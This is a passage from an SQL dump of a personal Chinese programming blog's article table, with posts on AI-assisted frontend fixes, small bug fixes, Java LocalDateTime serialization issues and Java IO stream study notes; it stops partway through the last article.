INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (47, '博客前端再次更新', 'front-update-again', '使用AI完成博客的前端代码后，发现markdown的展示有问题，于是通过搜MdEditorV3的官方文档并把它喂给AI之后他终于理解了问题的根源并做出了修改。', '# 博客前端再次更新\n## 关于AI\n没有钱只能用免费的TRAE，这些前端界面最初使用Qoder做的，在需求明确的前提下，Qoder竟然一次就完成了，不过做完之后还是有些小BUG，可惜到此之后免费的额度就用完了。\n于是后面只能用那个很废物的TRAE了，一直同一个问题改来改去也没改出来，不过最后在我想到突破点之后，把方法和文档喂给它也算勉强解决了，\n现在应该可以正常展示markdown文档了（但愿吧😔）。\n## 代码测试\n### 行内代码测试\n`这是一段行内代码`\n### 代码块测试\n\n```java\npublic static void main(String[] args) {\n  System.out.println(\"Hello World!\");\n  return;\n}\n```\n## 图类测试\n### 时序图\n```mermaid\nsequenceDiagram\n  A->>B: hello!\n  B-->>A: hi!\n```\n### 流程图\n```mermaid\nflowchart TD \n  开始 --> 输入x\n  输入x -- x为1 --> 输出\n  输入x --不为1--> x赋值为x减1\n  x赋值为x减1 --> 输入x\n  输出 --> 结束\n```\n### 饼图\n\n```mermaid\npie\n  title 零食店销售量\n  \"零食恨莽\" : 3542\n  \"亚迪亚迪\" : 4239\n  \"兆亿铭\" : 1223\n  \"其他\" : 1232\n```\n\n\n\n\n\n\n', '<h1 id=\"博客前端再次更新\">博客前端再次更新</h1>\n<h2 id=\"关于ai\">关于AI</h2>\n<p>没有钱只能用免费的TRAE，这些前端界面最初使用Qoder做的，在需求明确的前提下，Qoder竟然一次就完成了，不过做完之后还是有些小BUG，可惜到此之后免费的额度就用完了。<br>\n于是后面只能用那个很废物的TRAE了，一直同一个问题改来改去也没改出来，不过最后在我想到突破点之后，把方法和文档喂给它也算勉强解决了，<br>\n现在应该可以正常展示markdown文档了（但愿吧😔）。</p>\n<h2 id=\"代码测试\">代码测试</h2>\n<h3 id=\"行内代码测试\">行内代码测试</h3>\n<p><code>这是一段行内代码</code></p>\n<h3 id=\"代码块测试\">代码块测试</h3>\n<pre><code class=\"language-java\">public static void main(String[] args) {\n  System.out.println(&quot;Hello World!&quot;);\n  return;\n}\n</code></pre>\n<h2 id=\"图类测试\">图类测试</h2>\n<h3 id=\"时序图\">时序图</h3>\n<pre><code class=\"language-mermaid\">sequenceDiagram\n  A-&gt;&gt;B: hello!\n  B--&gt;&gt;A: hi!\n</code></pre>\n<h3 id=\"流程图\">流程图</h3>\n<pre><code class=\"language-mermaid\">flowchart TD \n  开始 --&gt; 输入x\n  输入x -- x为1 --&gt; 输出\n  输入x --不为1--&gt; x赋值为x减1\n  x赋值为x减1 --&gt; 输入x\n  输出 --&gt; 结束\n</code></pre>\n<h3 id=\"饼图\">饼图</h3>\n<pre><code class=\"language-mermaid\">pie\n  title 零食店销售量\n  &quot;零食恨莽&quot; : 3542\n  &quot;亚迪亚迪&quot; : 4239\n  &quot;兆亿铭&quot; : 1223\n  &quot;其他&quot; : 1232\n</code></pre>\n', NULL, 1, 45, 2, '2026-03-30 18:45:02', '2026-05-19 09:44:13', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (48, '试一下封面图片', 'test-for-cover', '测试一下封面图片', 'no content\n', '<p data-line=\"0\">no content</p>\n', 'https://img.tukuppt.com/png_preview/00/22/92/LrD8E45W70.jpg!/fw/780', 1, 28, 2, '2026-03-30 23:12:39', '2026-05-19 09:43:44', 2, 2, 1);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (49, '继续测试markdown编辑器', 'test-3', '尝试通过图床来传图片', '# 测试用的图片\n\n## 小黄人\n\n![](https://oss.lilicould.cn/file/f6768245-d4f5-475a-90bf-5b274132198b_小黄人.png)\n\n## 之前python课的作业\n\n![](https://oss.lilicould.cn/file/2255bda0-5bd2-4c84-8109-b7c66fd72ab2_R-C.jpg)\n', '<h1 id=\"测试用的图片\">测试用的图片</h1>\n<h2 id=\"小黄人\">小黄人</h2>\n<p><img src=\"https://oss.lilicould.cn/file/f6768245-d4f5-475a-90bf-5b274132198b_%E5%B0%8F%E9%BB%84%E4%BA%BA.png\" alt=\"\" /></p>\n<h2 id=\"之前python课的作业\">之前python课的作业</h2>\n<p><img src=\"https://oss.lilicould.cn/file/2255bda0-5bd2-4c84-8109-b7c66fd72ab2_R-C.jpg\" alt=\"\" /></p>\n', 'https://oss.lilicould.cn/cover/3e267468-1eae-4622-bc4e-9ed98c50cf56_后端代码.png', 1, 53, 2, '2026-03-30 23:48:49', '2026-05-19 09:42:59', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (53, '小更新', 'litltle-upgrade', '今天是愚人节，不重要。对博客进行了一些小更新（修复一些已知BUG）', '# 小更新\n\n---\n\n依旧小改BUG\n-----------\n\n小小的对自己的博客做了一些小小修复。\n\n---\n\n## 1. 作者名终于不显示用户名了\n\n之前文章下面显示的是登录用户名，现在改成昵称了，舒服多了。\n\n---\n\n## 2. 用ThreadLocal做了权限控制\n\n之前\"我的文章\"页面有个很蠢的bug：你能看到所有人的文章，只是不能编辑别人的。就像你家门没锁，别人进来看一圈但保证不动你东西... 我当时写的时候居然没有发现这么离谱的错误\n\n今天用ThreadLocal重构了一下：\n\n```java\npublic class BaseContextUtil {\n    private static final ThreadLocal<String> usernameThreadLocal = new ThreadLocal<>();\n\n    public static void set(String username) {\n        usernameThreadLocal.set(username);\n    }\n\n    public static String get() {\n        return usernameThreadLocal.get();\n    }\n  \n    public static void remove() {\n        usernameThreadLocal.remove();  // 别忘了清，会内存泄漏\n    }\n}\n```\n\n拦截器里塞进去，Service里直接取，不用每个方法都传参，清爽。\n\n---\n\n## 3. 拼写错误导致搜索崩了\n\n![](https://kimi-web-img.moonshot.cn/img/img.freepik.com/f7eb8974fe0350b633691f305c62eaae73953083.jpg)\n\n\n> 最离谱的bug来了。\n\n搜索功能一直搜不出东西，我debug了一下，最后发现我写的是：\n\n```java\n\n// 过滤未发布文章\narticles.removeIf(article -> !article.getStatus().equals(\"PUBLISHED\"));\n```\n\n就多了个ED，所有文章都被过滤掉了。我盯着这行代码看了十分钟才看出来。\n**血的教训**：千万不要手写字符串，尽量用枚举或定义常量。\n还有就是竟然先查出来再过滤，肯定是直接在SQL里面写的。不知道当时自己怎么想的。\n\n---\n\n## 4. 后面打算搞的事\n\n现在这博客还糙得很，后面慢慢完善：\n\n- **邮箱认证** - 注册要验邮箱\n- **评论功能** - 现在只能看不能聊，寂寞\n- **审核机制** - 防 ~~spam~~不文明信息\n- **图片上传** - 现在要传图片还得用别的图床，自己一个接口的事，再配个OSS\n- **安全防护** - 封异常IP、防恶意注册之类的\n\n代码也得重构，现在写得跟面条似的，自己看着都头疼。\n\n---\n\n## 写在最后\n\n就这样吧，反正也就自己看一看。\n话说现在AI确实够强的，以前写一个页面都丑丑的，现在直接把所有页面都生成出来也还不错。\n不过还是略微差强人意，前端也有一些BUG，慢慢改就好了。\n', '<h1 id=\"小更新\">小更新</h1>\n<hr />\n<h2 id=\"依旧小改bug\">依旧小改BUG</h2>\n<p>小小的对自己的博客做了一些小小修复。</p>\n<hr />\n<h2 id=\"1-作者名终于不显示用户名了\">1. 作者名终于不显示用户名了</h2>\n<p>之前文章下面显示的是登录用户名，现在改成昵称了，舒服多了。</p>\n<hr />\n<h2 id=\"2-用threadlocal做了权限控制\">2. 用ThreadLocal做了权限控制</h2>\n<p>之前&quot;我的文章&quot;页面有个很蠢的bug：你能看到所有人的文章，只是不能编辑别人的。就像你家门没锁，别人进来看一圈但保证不动你东西... 我当时写的时候居然没有发现这么离谱的错误</p>\n<p>今天用ThreadLocal重构了一下：</p>\n<pre><code class=\"language-java\">public class BaseContextUtil {\n    private static final ThreadLocal&lt;String&gt; usernameThreadLocal = new ThreadLocal&lt;&gt;();\n\n    public static void set(String username) {\n        usernameThreadLocal.set(username);\n    }\n\n    public static String get() {\n        return usernameThreadLocal.get();\n    }\n  \n    public static void remove() {\n        usernameThreadLocal.remove();  // 别忘了清，会内存泄漏\n    }\n}\n</code></pre>\n<p>拦截器里塞进去，Service里直接取，不用每个方法都传参，清爽。</p>\n<hr />\n<h2 id=\"3-拼写错误导致搜索崩了\">3. 拼写错误导致搜索崩了</h2>\n<p><img src=\"https://kimi-web-img.moonshot.cn/img/img.freepik.com/f7eb8974fe0350b633691f305c62eaae73953083.jpg\" alt=\"\" /></p>\n<blockquote>\n  <p>最离谱的bug来了。</p>\n</blockquote>\n<p>搜索功能一直搜不出东西，我debug了一下，最后发现我写的是：</p>\n<pre><code class=\"language-java\">\n// 过滤未发布文章\narticles.removeIf(article -&gt; !article.getStatus().equals(&quot;PUBLISHED&quot;));\n</code></pre>\n<p>就多了个ED，所有文章都被过滤掉了。我盯着这行代码看了十分钟才看出来。<br>\n<strong>血的教训</strong>：千万不要手写字符串，尽量用枚举或定义常量。<br>\n还有就是竟然先查出来再过滤，肯定是直接在SQL里面写的。不知道当时自己怎么想的。</p>\n<hr />\n<h2 id=\"4-后面打算搞的事\">4. 后面打算搞的事</h2>\n<p>现在这博客还糙得很，后面慢慢完善：</p>\n<ul>\n  <li><strong>邮箱认证</strong> - 注册要验邮箱</li>\n  <li><strong>评论功能</strong> - 现在只能看不能聊，寂寞</li>\n  <li><strong>审核机制</strong> - 防 <del>spam</del>不文明信息</li>\n  <li><strong>图片上传</strong> - 现在要传图片还得用别的图床，自己一个接口的事，再配个OSS</li>\n  <li><strong>安全防护</strong> - 封异常IP、防恶意注册之类的</li>\n</ul>\n<p>代码也得重构，现在写得跟面条似的，自己看着都头疼。</p>\n<hr />\n<h2 id=\"写在最后\">写在最后</h2>\n<p>就这样吧，反正也就自己看一看。<br>\n话说现在AI确实够强的，以前写一个页面都丑丑的，现在直接把所有页面都生成出来也还不错。<br>\n不过还是略微差强人意，前端也有一些BUG，慢慢改就好了。</p>\n', 'https://lilicould.cn:8888/uploads/e352fdbb-bb9a-40ea-b361-ef46bf4b1046.png', 1, 72, 2, '2026-04-01 23:31:39', '2026-05-19 09:40:43', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (54, 'java的LocalDateTime和Date', 'LocalDateTime-and-Date', 'LocalDateTime作为现代化设计的包，在框架的适配上却远远不如Date这个理应被淘汰的包，其实主要还是因为历史原因。毕竟Date是java最早的时间工具类了。', '# 用 LocalDateTime 遇到的一堆坑和解决方法\n\n最近写项目时用了不少 `LocalDateTime`，然后被好几个框架轮番折腾了一下。这里把踩过的坑和解决方法记下来，算是给自己留个备忘，也给遇到同样问题的人一个参考。\n\n## 一、EasyExcel 不支持 LocalDateTime\n\n用 EasyExcel 导出 Excel 的时候，实体类里有 `LocalDateTime` 类型的字段，直接报错：\n\n```\nCan not find \'Converter\' support class LocalDateTime.\n```\n\n原因：EasyExcel 默认只内置了 `String`、`Integer`、`Date` 等基础类型的转换器，`LocalDateTime` 是 Java 8 之后才有的，没给默认支持。\n\n**解决方法：**\n\n写一个自定义 Converter：\n\n```java\npublic class LocalDateTimeConverter implements Converter<LocalDateTime> {\n    private static final DateTimeFormatter FORMATTER = \n        DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\n\n    @Override\n    public Class<LocalDateTime> supportJavaTypeKey() {\n        return LocalDateTime.class;\n    }\n\n    @Override\n    public CellDataTypeEnum supportExcelTypeKey() {\n        return CellDataTypeEnum.STRING;\n    }\n\n    @Override\n    public LocalDateTime convertToJavaData(CellData cellData, ExcelContentProperty property,\n                                           GlobalConfiguration config) throws Exception {\n        return LocalDateTime.parse(cellData.getStringValue(), FORMATTER);\n    }\n\n    @Override\n    public CellData<LocalDateTime> convertToExcelData(LocalDateTime value, ExcelContentProperty property,\n                                                      GlobalConfiguration config) throws Exception {\n        return new CellData<>(value.format(FORMATTER));\n    }\n}\n```\n\n然后在字段上指定 converter：\n\n```java\n@ExcelProperty(value = \"创建时间\", converter = LocalDateTimeConverter.class)\nprivate LocalDateTime createTime;\n```\n\n或者直接用 `@DateTimeFormat` 注解（更省事）：\n\n```java\n@ExcelProperty(value = \"创建时间\")\n@DateTimeFormat(\"yyyy-MM-dd HH:mm:ss\")\nprivate LocalDateTime createTime;\n```\n\n## 二、Jackson 序列化 LocalDateTime 变成数组\n\n用 Jackson 把对象转成 JSON，默认会把 `LocalDateTime` 变成数组形式：\n\n```json\n{\n  \"createTime\": [2024, 3, 15, 14, 30, 0]\n}\n```\n\n或者变成 ISO 格式 `2024-05-20T14:30:00`，都不是想要的 `yyyy-MM-dd HH:mm:ss`。\n\n有人在 `application.yml` 里配 `date-format`，但这个配置只对 `java.util.Date` 有效，对 `LocalDateTime` 没用。\n\n**解决方法一：字段上加 `@JsonFormat`**\n\n```java\n@JsonFormat(pattern = \"yyyy-MM-dd HH:mm:ss\", timezone = \"GMT+8\")\nprivate LocalDateTime createTime;\n```\n\n**解决方法二：全局配置**\n\n```java\n@Configuration\npublic class JacksonConfig {\n    @Bean\n    public Jackson2ObjectMapperBuilderCustomizer jsonCustomizer() {\n        return builder -> {\n            JavaTimeModule module = new JavaTimeModule();\n            module.addSerializer(LocalDateTime.class, \n                new LocalDateTimeSerializer(DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\")));\n            module.addDeserializer(LocalDateTime.class, \n                new LocalDateTimeDeserializer(DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\")));\n            builder.modules(module);\n            builder.featuresToDisable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);\n        };\n    }\n}\n```\n\n关键点是 `JavaTimeModule`，这是 Jackson 对 Java 8 时间 API 的支持模块。\n\n注意区分：`@JsonFormat` 控制序列化（Java→JSON），`@DateTimeFormat` 控制反序列化（JSON→Java），不是一回事。\n\n## 三、Redis 序列化 LocalDateTime 失败\n\n用 Spring Data Redis 存对象，对象里有 `LocalDateTime` 字段，存的时候没事，读的时候报错：\n\n```\nCannot deserialize value of type java.time.LocalDateTime from String\n```\n\n原因：默认的 `Jackson2JsonRedisSerializer` 没有注册 `JavaTimeModule`，不认识 `LocalDateTime`。\n\n**解决方法：配置 RedisTemplate，注册 `JavaTimeModule`**\n\n```java\n@Configuration\npublic class RedisConfig {\n    @Bean\n    public RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory factory,\n                                                       ObjectMapper objectMapper) {\n        RedisTemplate<String, Object> template = new RedisTemplate<>();\n        template.setConnectionFactory(factory);\n        \n        StringRedisSerializer stringSerializer = new StringRedisSerializer();\n        template.setKeySerializer(stringSerializer);\n        template.setHashKeySerializer(stringSerializer);\n        \n        // 关键：把 JavaTimeModule 注册进去\n        objectMapper.registerModule(new JavaTimeModule());\n        Jackson2JsonRedisSerializer<Object> jacksonSerializer = \n            new Jackson2JsonRedisSerializer<>(Object.class);\n        jacksonSerializer.setObjectMapper(objectMapper);\n        \n        template.setValueSerializer(jacksonSerializer);\n        template.setHashValueSerializer(jacksonSerializer);\n        template.afterPropertiesSet();\n        return template;\n    }\n}\n```\n\n一个小技巧：直接注入 Spring Boot 已经配好的 `ObjectMapper`，这样 Redis 里的序列化格式和 HTTP 接口保持一致。\n\n## 四、MySQL 时区问题（番外）\n\n这个不是 `LocalDateTime` 自己的锅，但经常一起遇到。\n\n用 `LocalDateTime.now()` 存到数据库，发现存进去的时间比实际少了 8 小时（或多了）。原因是 MySQL 驱动做转换时依赖 `serverTimezone` 参数和数据库服务器的默认时区。\n\n**解决方法：JDBC 连接串里显式指定时区**\n\n```\njdbc:mysql://localhost:3306/db?serverTimezone=Asia/Shanghai\n```\n\n如果用 UTC 就写 `serverTimezone=UTC`。\n\n另外注意：实体类用 `LocalDateTime` 的话，数据库字段类型最好用 `DATETIME`，不要用 `TIMESTAMP`。因为 `TIMESTAMP` 会自动做时区转换，容易出乱子。\n\n## 五、总结\n\n`LocalDateTime` 本身没问题，API 比 `Date` 好太多了。但是很多框架默认不认识它，需要手动配一下。把上面这些配置一次性弄好，后面用起来就舒服多了。\n\n几个小建议：\n\n1. 建一个公共配置类，把 Jackson、EasyExcel、Redis 的序列化配置都放在一起。\n2. 确保项目里有 `jackson-datatype-jsr310` 依赖。\n3. JDBC 连接串显式写时区。\n4. 如果应用要跨时区部署，考虑用 `Instant` 或 `ZonedDateTime` 代替 `LocalDateTime`。', '<h1 id=\"用-localdatetime-遇到的一堆坑和解决方法\">用 LocalDateTime 遇到的一堆坑和解决方法</h1>\n<p>最近写项目时用了不少 <code>LocalDateTime</code>，然后被好几个框架轮番折腾了一下。这里把踩过的坑和解决方法记下来，算是给自己留个备忘，也给遇到同样问题的人一个参考。</p>\n<h2 id=\"一easyexcel-不支持-localdatetime\">一、EasyExcel 不支持 LocalDateTime</h2>\n<p>用 EasyExcel 导出 Excel 的时候，实体类里有 <code>LocalDateTime</code> 类型的字段，直接报错：</p>\n<pre><code>Can not find \'Converter\' support class LocalDateTime.\n</code></pre>\n<p>原因：EasyExcel 默认只内置了 <code>String</code>、<code>Integer</code>、<code>Date</code> 等基础类型的转换器，<code>LocalDateTime</code> 是 Java 8 之后才有的，没给默认支持。</p>\n<p><strong>解决方法：</strong></p>\n<p>写一个自定义 Converter：</p>\n<pre><code class=\"language-java\">public class LocalDateTimeConverter implements Converter&lt;LocalDateTime&gt; {\n    private static final DateTimeFormatter FORMATTER = \n        DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss&quot;);\n\n    @Override\n    public Class&lt;LocalDateTime&gt; supportJavaTypeKey() {\n        return LocalDateTime.class;\n    }\n\n    @Override\n    public CellDataTypeEnum supportExcelTypeKey() {\n        return CellDataTypeEnum.STRING;\n    }\n\n    @Override\n    public LocalDateTime convertToJavaData(CellData cellData, ExcelContentProperty property,\n                                           GlobalConfiguration config) throws Exception {\n        return LocalDateTime.parse(cellData.getStringValue(), FORMATTER);\n    }\n\n    @Override\n    public CellData&lt;LocalDateTime&gt; convertToExcelData(LocalDateTime value, ExcelContentProperty property,\n                                                      GlobalConfiguration config) throws Exception {\n        return new CellData&lt;&gt;(value.format(FORMATTER));\n    }\n}\n</code></pre>\n<p>然后在字段上指定 converter：</p>\n<pre><code class=\"language-java\">@ExcelProperty(value = &quot;创建时间&quot;, converter = LocalDateTimeConverter.class)\nprivate LocalDateTime createTime;\n</code></pre>\n<p>或者直接用 <code>@DateTimeFormat</code> 注解（更省事）：</p>\n<pre><code class=\"language-java\">@ExcelProperty(value = &quot;创建时间&quot;)\n@DateTimeFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;)\nprivate LocalDateTime createTime;\n</code></pre>\n<h2 id=\"二jackson-序列化-localdatetime-变成数组\">二、Jackson 序列化 LocalDateTime 变成数组</h2>\n<p>用 Jackson 把对象转成 JSON，默认会把 <code>LocalDateTime</code> 变成数组形式：</p>\n<pre><code class=\"language-json\">{\n  &quot;createTime&quot;: [2024, 3, 15, 14, 30, 0]\n}\n</code></pre>\n<p>或者变成 ISO 格式 <code>2024-05-20T14:30:00</code>，都不是想要的 <code>yyyy-MM-dd HH:mm:ss</code>。</p>\n<p>有人在 <code>application.yml</code> 里配 <code>date-format</code>，但这个配置只对 <code>java.util.Date</code> 有效，对 <code>LocalDateTime</code> 没用。</p>\n<p><strong>解决方法一：字段上加 <code>@JsonFormat</code></strong></p>\n<pre><code class=\"language-java\">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)\nprivate LocalDateTime createTime;\n</code></pre>\n<p><strong>解决方法二：全局配置</strong></p>\n<pre><code class=\"language-java\">@Configuration\npublic class JacksonConfig {\n    @Bean\n    public Jackson2ObjectMapperBuilderCustomizer jsonCustomizer() {\n        return builder -&gt; {\n            JavaTimeModule module = new JavaTimeModule();\n            module.addSerializer(LocalDateTime.class, \n                new LocalDateTimeSerializer(DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss&quot;)));\n            module.addDeserializer(LocalDateTime.class, \n                new LocalDateTimeDeserializer(DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss&quot;)));\n            builder.modules(module);\n            builder.featuresToDisable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);\n        };\n    }\n}\n</code></pre>\n<p>关键点是 <code>JavaTimeModule</code>，这是 Jackson 对 Java 8 时间 API 的支持模块。</p>\n<p>注意区分：<code>@JsonFormat</code> 控制序列化（Java→JSON），<code>@DateTimeFormat</code> 控制反序列化（JSON→Java），不是一回事。</p>\n<h2 id=\"三redis-序列化-localdatetime-失败\">三、Redis 序列化 LocalDateTime 失败</h2>\n<p>用 Spring Data Redis 存对象，对象里有 <code>LocalDateTime</code> 字段，存的时候没事，读的时候报错：</p>\n<pre><code>Cannot deserialize value of type java.time.LocalDateTime from String\n</code></pre>\n<p>原因：默认的 <code>Jackson2JsonRedisSerializer</code> 没有注册 <code>JavaTimeModule</code>，不认识 <code>LocalDateTime</code>。</p>\n<p><strong>解决方法：配置 RedisTemplate，注册 <code>JavaTimeModule</code></strong></p>\n<pre><code class=\"language-java\">@Configuration\npublic class RedisConfig {\n    @Bean\n    public RedisTemplate&lt;String, Object&gt; redisTemplate(RedisConnectionFactory factory,\n                                                       ObjectMapper objectMapper) {\n        RedisTemplate&lt;String, Object&gt; template = new RedisTemplate&lt;&gt;();\n        template.setConnectionFactory(factory);\n        \n        StringRedisSerializer stringSerializer = new StringRedisSerializer();\n        template.setKeySerializer(stringSerializer);\n        template.setHashKeySerializer(stringSerializer);\n        \n        // 关键：把 JavaTimeModule 注册进去\n        objectMapper.registerModule(new JavaTimeModule());\n        Jackson2JsonRedisSerializer&lt;Object&gt; jacksonSerializer = \n            new Jackson2JsonRedisSerializer&lt;&gt;(Object.class);\n        jacksonSerializer.setObjectMapper(objectMapper);\n        \n        template.setValueSerializer(jacksonSerializer);\n        template.setHashValueSerializer(jacksonSerializer);\n        template.afterPropertiesSet();\n        return template;\n    }\n}\n</code></pre>\n<p>一个小技巧：直接注入 Spring Boot 已经配好的 <code>ObjectMapper</code>，这样 Redis 里的序列化格式和 HTTP 接口保持一致。</p>\n<h2 id=\"四mysql-时区问题番外\">四、MySQL 时区问题（番外）</h2>\n<p>这个不是 <code>LocalDateTime</code> 自己的锅，但经常一起遇到。</p>\n<p>用 <code>LocalDateTime.now()</code> 存到数据库，发现存进去的时间比实际少了 8 小时（或多了）。原因是 MySQL 驱动做转换时依赖 <code>serverTimezone</code> 参数和数据库服务器的默认时区。</p>\n<p><strong>解决方法：JDBC 连接串里显式指定时区</strong></p>\n<pre><code>jdbc:mysql://localhost:3306/db?serverTimezone=Asia/Shanghai\n</code></pre>\n<p>如果用 UTC 就写 <code>serverTimezone=UTC</code>。</p>\n<p>另外注意：实体类用 <code>LocalDateTime</code> 的话，数据库字段类型最好用 <code>DATETIME</code>，不要用 <code>TIMESTAMP</code>。因为 <code>TIMESTAMP</code> 会自动做时区转换，容易出乱子。</p>\n<h2 id=\"五总结\">五、总结</h2>\n<p><code>LocalDateTime</code> 本身没问题，API 比 <code>Date</code> 好太多了。但是很多框架默认不认识它，需要手动配一下。把上面这些配置一次性弄好，后面用起来就舒服多了。</p>\n<p>几个小建议：</p>\n<ol>\n  <li>建一个公共配置类，把 Jackson、EasyExcel、Redis 的序列化配置都放在一起。</li>\n  <li>确保项目里有 <code>jackson-datatype-jsr310</code> 依赖。</li>\n  <li>JDBC 连接串显式写时区。</li>\n  <li>如果应用要跨时区部署，考虑用 <code>Instant</code> 或 <code>ZonedDateTime</code> 代替 <code>LocalDateTime</code>。</li>\n</ol>\n', 'https://oss.lilicould.cn/cover/ff9c2777-eb77-404a-a134-8f1c5a6e376c_后端代码.png', 1, 9, 2, '2026-04-02 20:44:42', '2026-05-19 09:37:35', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (55, 'java的IO流学习笔记', 'IO-Stream-study', '2025年七八月时候学java的IO流做的笔记', '# IO流\n\n存储和读取数据的解决方案\n\nInputStream,OutputStream,Reader,Writer是所有输入输出流的父类\n\n## IO流的分类\n\n按流向可分为输入流和输出流，按操作文件的类型可分为字节流和字符流\n\n<p style=\"color: red;\">字节流可以操作所有文件，字符流只能操作纯文本文件</p>\n\n# 字节流\n\n1. 字节输入流InputStream\n2. 字节输出流OutputStream\n\n## 字节输出流的使用——以FileOutputStream为例\n\n### 基本使用\n\nFileOutputStream为OutPutStream的一个子类，用于操作本地文件的输出流，可以把程序中的数据写出到本地文件中\n\n书写步骤：\n\n1. 创建字节输出流对象\n2. 写数据\n3. 释放资源\n\n代码示例\n\n```java\nString FileName = \"文件路径\"\nFile file = new File(fileName);\nString readyToOutput = \"通过FileOutputStream输出\";\ntry {\n    FileOutputStream fileOutputStream = new FileOutputStream(file); //创建字节输出流对象（相当于打开文件）\n    //此处使用File对象作为参数，也可直接使用文件路径作为参数\n    fileOutputStream.write(readyToOutput.getBytes()); //写入数据（字节输出流不能直接写入字符流数据，需要先进行转换）\n    fileOutputStream.close(); //释放资源（断开连接，相当于关闭文件）\n} catch (IOException e) {\n    System.out.println(e.getMessage());\n}\n```\n\n若文件不存在，会创建文件，若文件已存在，会覆盖文件内容\n\n### 字节输出流写出数据的三种方式\n\n\n\n| 方法名称                               | 说明                         |\n| -------------------------------------- | ---------------------------- |\n| void write(int b)                      | 一次写出一个字节数据         |\n| void write(byte[] b)                   | 一次写一个字节数组数据       |\n| void write(byte[] b, int off, int len) | 一次写一个字节数组的部分数据 |\n\nvoid write(byte[] b, int off, int len)中三个参数说明\n\n* b : 数组\n* off : 起始索引\n* len : 个数\n\n例如\n\n``` java\ntry {\n    FileOutputStream fos = new FileOutputStream(\"newDir/newFile.txt\");\n    byte[] b = \"abcde\".getBytes();\n    fos.write(b, 1, 2);\n    fos.close();\n} catch (IOException e) {\n    System.out.println(e.getMessage());\n}\n```\n\n最终newFile.txt中内容为\"bc\"\n\n### 换行与续写\n\n1. 换行：通过“\\r\\n”（Windows）实现换行\n\n   代码实现：\n\n   ``` java\n   byte[] b = \"abcde\".getBytes();\n   byte[] b1 = \"fghij\".getBytes();\n   byte[] wrap = \"\\r\\n\".getBytes();\n   fos.write(b);\n   fos.write(wrap);\n   fos.write(b1);\n   ```\n\n2. 续写：在new FileOutputStream()创建字节输出流对象时将第二个参数(append)设为true（默认为false）\n\n## 字节输入流的使用——以FileInputStream为例\n\n### 基本使用\n\n书写步骤：\n\n1. 创建字节输入流对象\n2. 读数据\n3. 释放资源\n\n使用基本与输出流一致，写数据即使用read()替换write()方法\n\nint read()方法说明：\n\n* 该方法会一个**字节**一个**字节**地依次读取文件中的数据\n* 当读到文件的末尾时，返回数据为-1\n\n### 输入流的一些细节\n\n1. 输出流若文件不存在会自动创建，而输入流会直接报错\n2. 读出来的数据是ASCII对应的数字\n3. 每次使用完必须close()释放资源（防止资源占用导致其他程序无法使用）\n\n### 循环读取到文件末尾\n\n代码示例：\n\n``` java\ntry {\n    FileInputStream fis = new FileInputStream(\"newDir/newFile.txt\");\n    int b = 0;\n    while ((b = fis.read()) != -1){\n        System.out.print((char)b);\n    }\n    System.out.println();\n    fis.close();\n}catch (IOException e){\n    System.out.println(e.getMessage());\n}\n```\n\n## 通过输入输出流实现文件拷贝\n\n代码示例：\n\n``` java\ntry {\n    FileInputStream fis = new FileInputStream(\"待拷贝文件路径\");\n    FileOutputStream fos = new FileOutputStream(\"目标文件路劲\");\n    int b = 0;\n    while ((b = fis.read()) != -1) {\n        fos.write(b);\n    }\n    fis.close();\n    fos.close();\n} catch (Exception e) {\n    System.out.println(e.getMessage());\n}\n```\n\n弊端：一次拷贝一个字节速度过慢\n\n解决方法：一次拷贝多个字节\n\n| 方法                         | 描述                                                 |\n| ---------------------------- | ---------------------------------------------------- |\n| public int read()            | 一次读取一个字节数据                                 |\n| public int read(byte buffer) | 一次读取一个字节数组数据，每次读取会尽可能把数组装满 |\n\n解决代码示例\n\n``` java\n try {\n    FileInputStream fis = new FileInputStream(\"newDir/test.mp4\");\n    FileOutputStream fos = new FileOutputStream(\"newDir/output.mp4\");\n\n    // 拷贝开始时间\n    long start = System.currentTimeMillis();\n    byte[] bytes = new byte[1024*1024*5];//每次拷贝5Mb的数据块\n    int len;\n    int already = 0;\n    while ((len = fis.read(bytes)) != -1) {\n        fos.write(bytes, 0, len);\n        already += len;\n        System.out.println(\"已拷贝：\" + already/1024/1024 + \"MB\");\n    }\n    // 拷贝结束时间\n    long end = System.currentTimeMillis();\n    System.out.println(\"拷贝完成，耗时：\" + (end - start) + \"ms\");\n\n    fos.close();\n    fis.close();\n} catch (Exception e) {\n    System.out.println(e.getMessage());\n}\n```\n\n最简单的拷贝方法：\n\n``` java\nfis.transferTo(fos);\n```\n\n# 字符流\n\n## 基础介绍\n\n字符流=字节流+字符集\n\n分类：\n\n1. 字符输入流Reader\n2. 